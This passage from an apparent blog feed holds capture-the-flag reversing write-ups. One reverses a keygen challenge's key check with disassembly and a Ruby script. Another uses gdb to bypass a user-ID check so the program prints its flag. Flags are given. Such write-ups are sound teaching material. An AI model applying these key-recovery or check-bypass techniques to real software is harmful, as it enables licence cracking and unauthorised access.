</span><span class='line'>Compressions can be hard at <span class="nb">times</span>
</span></code></pre></td></tr></table></div></figure>

<h2>Solution</h2>

<p>Compressions can be hard at times</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hack You Too - Keygen Me?]]></title>
    <link href="http://www.captchaflag.com/blog/2013/01/07/hack-you-too-keygen-me/"/>
    <updated>2013-01-07T21:14:00-05:00</updated>
    <id>http://www.captchaflag.com/blog/2013/01/07/hack-you-too-keygen-me</id>
    <content type="html"><![CDATA[<h2>Challenge</h2>

<p>You need the right key.</p>

<p>File: <a href="http://hackyou.ctf.su/files/keygen_me.exe">keygen_me.exe</a></p>

<h2>Analysis</h2>

<p>Windows GUI executable. Simply takes one input and appears to check the result. When we enter junk, we get a message of <code>xD Try again!</code>. Looking at the strings, it is not completely obvious where this is printed. However, there are not many user functions and eventually we see a call to <a href="http://msdn.microsoft.com/en-us/library/ms645489%28VS.85%29.aspx">GetDlgItemTextA()</a> which stores user input from dialog box into a buffer.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>.text:01391252                 call    ds:GetDlgItemTextA</span></code></pre></td></tr></table></div></figure></p>

<p>Just following loading the user input into the buffer, we see manipulation of the data and a character by character comparison afterwards.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>.text:01391260 loc<em>1391260:
</span><span class='line'>.text:01391260                 mov     dl, [ebp+eax+String]
</span><span class='line'>.text:01391264                 add     dl, al
</span><span class='line'>.text:01391266                 xor     dl, byte ptr [ebp+eax+Hackplanet]
</span><span class='line'>.text:0139126A                 inc     eax
</span><span class='line'>.text:0139126B                 mov     [ebp+eax+key], dl
</span><span class='line'>.text:0139126F                 cmp     eax, 11
</span><span class='line'>.text:01391272                 jl      short loc</em>1391260
</span><span class='line'>.text:01391274                 cmp     [ebp+key+1], 39
</span><span class='line'>.text:01391278                 jnz     short loc<em>13912C5
</span><span class='line'>.text:0139127A                 cmp     [ebp+key+2], 15
</span><span class='line'>.text:0139127E                 jnz     short loc</em>13912C5
</span><span class='line'>.text:01391280                 cmp     [ebp+key+3], 11
</span><span class='line'>.text:01391284                 jnz     short loc<em>13912C5
</span><span class='line'>.text:01391286                 cmp     [ebp+key+4], 1
</span><span class='line'>.text:0139128A                 jnz     short loc</em>13912C5
</span><span class='line'>.text:0139128C                 cmp     [ebp+key+5], 60
</span><span class='line'>.text:01391290                 jnz     short loc<em>13912C5
</span><span class='line'>.text:01391292                 mov     cl, 10
</span><span class='line'>.text:01391294                 cmp     [ebp+key+6], cl
</span><span class='line'>.text:01391297                 jnz     short loc</em>13912C5
</span><span class='line'>.text:01391299                 mov     al, 8
</span><span class='line'>.text:0139129B                 cmp     [ebp+key+7], al
</span><span class='line'>.text:0139129E                 jnz     short loc<em>13912C5
</span><span class='line'>.text:013912A0                 cmp     [ebp+key+8], 28
</span><span class='line'>.text:013912A4                 jnz     short loc</em>13912C5
</span><span class='line'>.text:013912A6                 cmp     [ebp+key+9], al
</span><span class='line'>.text:013912A9                 jnz     short loc<em>13912C5
</span><span class='line'>.text:013912AB                 cmp     [ebp+key+0Ah], 25
</span><span class='line'>.text:013912AF                 jnz     short loc</em>13912C5
</span><span class='line'>.text:013912B1                 cmp     [ebp+key+0Bh], cl</span></code></pre></td></tr></table></div></figure></p>

<p>The following Ruby code reverses the above
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1">#!/usr/bin/env ruby</span>
</span><span class='line'>
</span><span class='line'><span class="n">key</span> <span class="o">=</span> <span class="s2">&quot;Hackplanet&quot;</span>
</span><span class='line'><span class="n">solution</span> <span class="o">=</span> <span class="o">[</span><span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x0f</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x0a</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x19</span><span class="o">]</span>
</span><span class='line'>
</span><span class='line'><span class="n">solution</span><span class="o">.</span><span class="n">each_index</span> <span class="k">do</span> <span class="o">|</span><span class="n">i</span><span class="o">|</span>
</span><span class='line'>    <span class="nb">print</span> <span class="p">((</span> <span class="n">key</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="n">ord</span> <span class="o">^</span> <span class="n">solution</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="p">)</span> <span class="o">-</span> <span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">chr</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'><span class="nb">puts</span> <span class="s2">&quot;&quot;</span>
</span></code></pre></td></tr></table></div></figure></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>stacks0n@stacks0ns-MacBook-Pro:~&gt; ./keygen_me.rb
</span><span class='line'>omfgHacked
</span></code></pre></td></tr></table></div></figure>

<h2>Solution</h2>

<p>omfgHacked</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ATAST 2012 - Challenge 11]]></title>
    <link href="http://www.captchaflag.com/blog/2013/01/02/atast-2012-challenge-11/"/>
    <updated>2013-01-02T22:00:00-05:00</updated>
    <id>http://www.captchaflag.com/blog/2013/01/02/atast-2012-challenge-11</id>
    <content type="html"><![CDATA[<h2>Analysis</h2>

<p>Reversing challenge. Program calls getuid() and compares against 0x934 before printing token.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>.text:0804852E                 call    <em>getuid
</span><span class='line'>.text:08048533                 cmp     eax, 2356
</span><span class='line'>.text:08048538                 jz      short loc</em>804855E
</span><span class='line'>.text:0804853A                 mov     dword ptr [esp], offset s ; &quot;Anuthorized Usage Deteceted &quot;
</span><span class='line'>.text:08048541                 call    <em>puts
</span><span class='line'>.text:08048546                 mov     dword ptr [esp], offset aProgramShuttin ; &quot;PROGRAM SHUTTING DOWN &quot;
</span><span class='line'>.text:0804854D                 call    _puts
</span><span class='line'>.text:08048552                 mov     dword ptr [esp], 1 ; status
</span><span class='line'>.text:08048559                 call    _exit
</span><span class='line'>.text:0804855E ; ---------------------------------------------------------------------------
</span><span class='line'>.text:0804855E
</span><span class='line'>.text:0804855E loc</em>804855E:                            ; CODE XREF: main+64j
</span><span class='line'>.text:0804855E                 mov     eax, offset format ; &quot;your token is %s\n&quot;
</span><span class='line'>.text:08048563                 lea     edx, [esp+32h]
</span><span class='line'>.text:08048567                 mov     [esp+4], edx
</span><span class='line'>.text:0804856B                 mov     [esp], eax      ; format
</span><span class='line'>.text:0804856E                 call    <em>printf</span></code></pre></td></tr></table></div></figure>
Simply change execution and get your flag:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) b * 0x08048533
</span><span class='line'>Breakpoint 1 at 0x8048533
</span><span class='line'>(gdb) c
</span><span class='line'>Continuing.
</span><span class='line'>
</span><span class='line'>Breakpoint 1, 0x08048533 in main ()
</span><span class='line'>(gdb) set $eax=0x934
</span><span class='line'>(gdb) c
</span><span class='line'>Continuing.
</span><span class='line'>your token is Y0U</em>G07<em>An07h3R</em>345Y_Fl49</span></code></pre></td></tr></table></div></figure></p>

<h2>Solution</h2>

<p>Y0U<em>G07</em>An07h3R<em>345Y</em>Fl49</p>
]]></content>
  </entry>
  
</feed>
